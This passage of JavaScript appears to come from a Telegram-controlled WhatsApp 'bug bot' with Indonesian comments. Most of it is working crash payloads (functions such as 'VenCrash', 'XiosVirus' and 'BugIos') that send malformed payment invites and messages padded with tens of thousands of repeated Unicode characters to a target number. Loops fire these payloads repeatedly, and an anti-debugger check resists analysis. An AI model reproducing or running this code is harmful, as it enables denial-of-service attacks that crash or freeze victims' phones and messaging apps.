      { url: `https://love.neekoi.me/noa?text=${encodeURIComponent(fullArgs)}` },
      { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${fullArgs}` }
    );
  } catch (err) {
    await ctx.reply(`Error: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});

//function bug
// VIRTEX BUG
//const { ios } = require("./virtex/ios.js");
//const { ngazab } = require("./virtex/ngazab");
//const { notif } = require("./virtex/notif");
const tdxlol = fs.readFileSync('./tdx.jpeg')



//bug ios
    async function VenCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await cay.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/reynzjirr",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }     
    async function QPayIos(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await cay.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    async function XiosVirus(target) {
      cay.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `🩸⃟⃨〫⃰‣ ⁖𝐓𝐫𝐨𝐮𝐛𝐥𝐞ܢ 𝐌𝐚𝐤𝐞𝐫*‣—` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(target) {
      for (let i = 0; i < 2; i++) {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `Wanna With Yours :)!`
        )
      );
    }
 async function sal_blank(target) {
    for (let i = 0; i <= 10; i++) {
    await InvisibleLoadFast(target)
    await Fc(target, ptcp = true)
    await overloadButton(target, ptcp = true)
    await BugIos(target)
    await OverloadCursor(target)
    await crashcursor(target, ptcp = true)
    await VillainCrashTotal(target, Ptcp = true)
    await VillainCrashNoClick(target)
    }

}

 async function villaincrash(target) {
    for (let i = 0; i <= 10; i++) {
    await InvisibleLoadFast(target)
    await Fc(target, ptcp = true)
    await FreezeTruns(target, ptcp = true)
    await BugIos(target)
    await OverloadCursor(target)
    await crashcursor(target, ptcp = true)
    await VillainCrashTotal(target, Ptcp = true)
    await VillainCrashNoClick(target)
    }

}
// Fungsi untuk mendapatkan jumlah bot yang aktif
const getActiveBotsCount = () => {
    return activeBots.length;
};

// Handler untuk command bot
const botCommandHandler = async (command, ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (command === "jadibot") {
        if (!text) {
            return ctx.reply("Masukkan nomor untuk menjadi bot! Contoh: `/jadibot 62xxxxxxxx`");
        }

        // Menghubungkan bot dan menunggu response
        await jadibot(ctx, text);

        // Menambahkan simbol 🟢🔴 untuk menunjukkan status
        ctx.reply(`🟢 Proces Pairing Code To ${text}...*`);
        //ctx.reply(`${pairc}`);
    } else if (command === "delbot") {
        if (!text) {
            return ctx.reply("Masukkan ID bot yang ingin dihapus! Contoh: `/delbot 1`");
        }

        // Ambil nomor berdasarkan ID
        const id = parseInt(text);
        if (isNaN(id) || id < 1 || id > activeBots.length) {
            return ctx.reply("ID tidak valid! Masukkan ID yang sesuai dari daftar.");
        }

        const botToRemove = activeBots[id - 1]; // Ambil bot berdasarkan ID (index dimulai dari 0)
        removeBotSession(botToRemove.number); // Hapus sesi bot
        activeBots.splice(id - 1, 1); // Hapus dari daftar aktif
        ctx.reply(`🔴 Bot dengan nomor ${botToRemove.number} telah dihapus.`);
    } else if (command === "statusbot") {
        const count = activeBots.length;

        if (count === 0) {
            return ctx.reply("Tidak ada bot yang aktif saat ini.");
        }

        // Menampilkan daftar bot aktif dengan ID
        const activeBotsList = activeBots.map((bot, index) => {
            const isActive = bot.isConnected ? '🔴' : '🟢'; // Status koneksi
            return `${index + 1}. ${isActive} *${bot.number}*`;
        }).join("\n");

        ctx.reply(`Jumlah bot yang aktif saat ini: ${count}\n\n${activeBotsList}`);
    }
};
bot.command("reqpair", async (ctx) => {  
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }
    
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Example: /reqpair 62Xxx");
    
    const target = formatPhoneNumber(q);    
    //console.log(`Target phone number: ${target}`);
    
    try {
        await jadibot(target, ctx);
        //ctx.reply("✅ Bot successfully activated!");
    } catch (error) {
        ctx.reply(`❌ An error occurred:\n\n${error.message}`);
    }
});


// Lokasi file session/creds.json
const sessionCredsPath = path.join(__dirname, "session", "creds.json");
const sessionFolderPath = path.join(__dirname, "session");

bot.command("delsession", async (ctx) => {
  // Periksa apakah folder session ada
  if (!fs.existsSync(sessionFolderPath)) {
    ctx.reply("❌ Folder 'session' tidak ditemukan. Tidak ada yang perlu dihapus.");
    return;
  }

  try {
    // Hapus folder dan isinya secara rekursif
    fs.rmSync(sessionFolderPath, { recursive: true, force: true });
    ctx.reply("✅ Folder 'session' berhasil dihapus.");
  } catch (error) {
    ctx.reply(`❌ Gagal menghapus folder 'session': ${error.message}`);
  }
});

// Integrasi dengan bot commands
bot.command("jadibot", (ctx) => botCommandHandler("jadibot", ctx));
bot.command("delbot", (ctx) => botCommandHandler("delbot", ctx));
bot.command("statusbot", (ctx) => botCommandHandler("statusbot", ctx));

    bot.launch().then(() => {
  const systemInfo = getSystemInfo();
  sendMessageToMe('✅ WhatsApp Has Been Connected\n' + systemInfo);
});
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    Object.keys(botSessions).forEach(botToken => {
        if (botSessions[botToken].expiresAt < now) {
            delete botSessions[botToken];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000); // Check every hour

function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
const os = require('os');